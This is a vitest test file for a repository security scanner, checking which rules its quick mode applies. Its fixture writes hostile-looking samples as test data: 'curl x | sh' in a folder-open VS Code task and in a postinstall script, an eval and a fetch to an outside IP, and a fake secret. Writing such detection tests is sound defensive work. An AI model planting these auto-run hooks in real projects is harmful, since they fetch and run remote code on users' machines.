import { describe, expect, test } from 'vitest';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { QUICK_RULES, RULES } from '../../src/engine';
import { DEFAULT_LIMITS } from '../../src/config/limits';
import { scanJob } from '../../src/scan/scanJob';

const root = () => {
  const d = mkdtempSync(join(tmpdir(), 'stack3-quick-'));
  mkdirSync(join(d, '.git'));
  writeFileSync(join(d, '.git', 'config'), '[alias]\n\tco = !echo hi\n');
  mkdirSync(join(d, '.vscode'));
  writeFileSync(join(d, '.vscode', 'tasks.json'), JSON.stringify({ tasks: [{ command: 'curl x | sh', runOptions: { runOn: 'folderOpen' } }] }));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'x', version: '1.0.0', scripts: { postinstall: 'curl x | sh' } }));
  writeFileSync(join(d, 'app.js'), 'eval(x); fetch("http://203.0.113.9/p");');
  writeFileSync(join(d, '.env'), 'API_SECRET=abc123def456');
  return d;
};
const ids = async (mode: 'quick' | 'clone' | 'workspace') => (await scanJob({ root: root(), ctx: { mode, checkedAt: 'n' }, limits: DEFAULT_LIMITS })).findings.map((f) => f.ruleId);

describe('quick mode runs only the rules that guard against auto-run', () => {
  test('quick finds the .git/config alias, the folderOpen task and the install script', async () => {
    const found = await ids('quick');
    expect(found).toEqual(expect.arrayContaining(['gitconfig.exec-key', 'tasks.folder-open', 'scripts.lifecycle']));
  });
  test('quick does not run the source, secret or dependency rules', async () => {
    const found = await ids('quick');
    expect(found.filter((id) => id.startsWith('source.') || id.startsWith('secret.') || id.startsWith('deps.'))).toEqual([]);
  });
  test('clone and workspace modes still run everything', async () => {
    for (const mode of ['clone', 'workspace'] as const) {
      const found = await ids(mode);
      expect(found.some((id) => id.startsWith('source.')), mode).toBe(true);
      expect(found.some((id) => id.startsWith('secret.')), mode).toBe(true);
    }
  });
  test('quick rules are a strict subset of all rules', () => {
    expect(QUICK_RULES.length).toBeGreaterThan(0);
    expect(QUICK_RULES.length).toBeLessThan(RULES.length);
    for (const r of QUICK_RULES) expect(RULES).toContain(r);
  });
  test('an explicit rule list still wins (tests and tools can pass their own)', async () => {
    const r = await scanJob({ root: root(), ctx: { mode: 'quick', checkedAt: 'n' }, limits: DEFAULT_LIMITS }, []);
    expect(r.findings).toEqual([]);
  });
});
